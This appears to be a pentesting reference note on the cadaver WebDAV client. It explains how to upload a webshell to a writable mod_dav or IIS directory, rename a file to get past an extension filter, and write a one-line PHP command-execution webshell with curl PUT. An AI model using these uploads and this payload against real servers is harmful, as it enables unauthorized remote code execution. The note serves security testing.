# cadaver

**Tags:** `#cadaver` `#webdav` `#filetransfer` `#upload` `#http`

Command-line WebDAV client — an interactive `ftp`-like shell over HTTP/HTTPS `PROPFIND`/`PUT`/`MOVE`/`DELETE`. In pentesting it's the fastest way to abuse a writable `mod_dav` directory: connect, `put` a webshell, and (if `PUT` of executable extensions is blocked) `move` an allowed upload to an executable name. Handles Basic/Digest auth and self-signed certs interactively.

**Source:** http://www.webdav.org/cadaver/ (Debian/Kali: `apt install cadaver`)
**Install:** `sudo apt install cadaver` — pre-packaged on Kali.

```bash
# Connect (prompts for creds if the collection is protected)
cadaver http://<target>/

# Inside the dav:> prompt
dav:/> put shell.php            # upload a webshell
dav:/> move blocked.txt ok.php  # rename-bypass a PUT extension filter
dav:/> ls                       # PROPFIND listing
dav:/> delete shell.php         # clean up
```

Non-interactive alternatives when a shell isn't wanted: `curl -X PUT http://<target>/shell.php -d '<?php system($_GET["cmd"]); ?>'`, or `davtest`/`nmap --script http-webdav-scan` to fingerprint DAV support and allowed methods first.

---

> [!note] **See also** — [[Services/Web Services/Apache|Apache]] — interactive WebDAV client for a writable `mod_dav` directory (`put` a webshell, or `move` an allowed upload to an executable extension when `PUT` of `.php` is filtered). Also [[Services/Web Services/IIS|IIS]] — same over a WebDAV-enabled IIS root (`put` an `.asp`/`.aspx` shell).

---

*Created: 2026-09-24*
*Updated: 2026-09-24*
*Model: claude-opus-4-8*
